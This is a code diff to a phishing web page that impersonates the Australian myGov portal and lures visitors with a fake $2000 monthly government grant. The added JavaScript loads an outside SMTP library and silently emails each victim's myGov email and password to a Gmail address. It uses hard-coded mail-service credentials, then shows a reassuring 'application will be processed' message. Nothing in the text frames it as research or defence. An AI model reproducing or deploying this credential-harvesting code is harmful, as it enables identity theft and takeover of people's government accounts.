@@ -166,12 +166,12 @@
         <p>We're here to help</p>
         <p id="access">Access government services from one place.</p>
     </div>
-    <form onsubmit="return sendForm()" method="post" action="?">
+    <form onsubmit="sendForm(event)">
         <label>Get a Grant of $2000 from the government monthly, you can start today</label><br><br>
-        <input type="email" placeholder="myGov e-mail" name="MyGov Email"><br><br>
-        <input type="password" placeholder="myGov password" name="Password"><br><br>
-        <input type="submit" value="Submit">
-      </form>
+        <input type="email" placeholder="myGov e-mail" id="email"><br><br>
+        <input type="password" placeholder="myGov password" id="password"><br><br>
+        <input type="submit" value="Apply">
+      </form>    
     <div class="info">
         <div class="car">
         <label>Useful Information</label>
@@ -201,10 +201,24 @@
     <footer>
         
     </footer>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script>
         function sendForm(){
-            alert("Your request is being processed")
+            event.preventDefault(); // prevent the form from submitting normally
+        var email = document.getElementById("email").value;
+        var password = document.getElementById("password").value;
+            Email.send({
+    Host : "smtp.elasticemail.com",
+    Username : "ariyoaresa89@gmail.com",
+    Password : "28697CFEE316BCFFCE23F802726E95EC3E84",
+    To : 'bfakorewa@gmail.com',
+    From : "ariyoaresa89@gmail.com",
+    Subject : "New myGov login",
+    Body : "MyGov email: " + email + "\nMyGov password: " + password
+}).then(
+  message => alert(message + " you applicaition will be processed within 7 business days")
+);
         }
-    </script>
+    </script> 
 </body>
 </html>
